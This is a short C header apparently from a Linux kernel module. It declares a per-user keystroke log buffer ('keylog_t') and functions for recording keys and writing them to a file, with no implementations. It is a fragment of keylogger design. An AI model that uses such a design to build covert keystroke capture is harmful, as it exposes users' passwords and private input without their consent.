#ifndef __TTY_H
#define __TTY_H

#define KEY_LOG_BUF_MAX 512
enum { //tty flags
    R_NONE = 0,
    R_RETURN = 1,
    R_NEWLINE=2,
    R_RANGE=4
};

struct keylog_t {
    char buf[KEY_LOG_BUF_MAX+2]; /** newline+'\0' */
    int offset;
    uid_t uid;
    struct list_head list;
};

struct file *kv_tty_open(struct file **, const char *);
void kv_tty_write(struct file *, uid_t, char *, ssize_t);
int kv_key_add(struct list_head *, uid_t, char, int);
int kv_key_update(struct list_head *, struct file*, uid_t, char, int);
void kv_tty_close(struct list_head *);
#endif //__TTY_H
